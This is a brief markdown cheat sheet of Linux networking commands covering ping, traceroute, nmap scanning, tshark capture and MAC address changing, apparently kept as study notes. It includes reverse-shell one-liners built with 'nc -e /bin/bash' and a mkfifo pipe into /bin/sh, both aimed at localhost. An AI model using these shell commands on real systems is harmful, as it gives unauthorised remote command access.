## Networking
### Basics
```bash
apt install net-tools traceroute -y
ping -c 2 [ip]
telnet [ip] [port]
ftp [ip] [port]
tracepath -b -n -l 1 [host]
traceroute -q 1 -n [host]
ss -ntlp
nmap -v -sV -T5 -p 21,22,80 [host]
```
### Reverse shell dev/tcp
```bash
nc -vlnp 4444
nc localhost 4444 -e /bin/bash

timeout 0.5 echo 2>/dev/null < /dev/tcp/localhost/80 && echo "open" || echo "closed"

timeout 0.5 echo < /dev/tcp/localhost/80 && echo "open" || echo "closed"
```
### Reverse shell FIFO
```bash
mkfifo /tmp/gustavo
ls -lh /tmp/

cat /tmp/gustavo | /bin/sh -i 2>&1 | nc -l localhost 4444 > /tmp/gustavo

nc localhost 4444

ls -lh /tmp/
```
### Tshark http
```bash
# i is interface
# Y is the grep term
tshark -i lo -Y "http"
```
### Change NIC
```bash
NIC="eth0"
ip link show $NIC
ip link set dev $NIC down
ip link set dev $NIC address 00:11:22:33:44:55
ip link set dev $NIC up
```
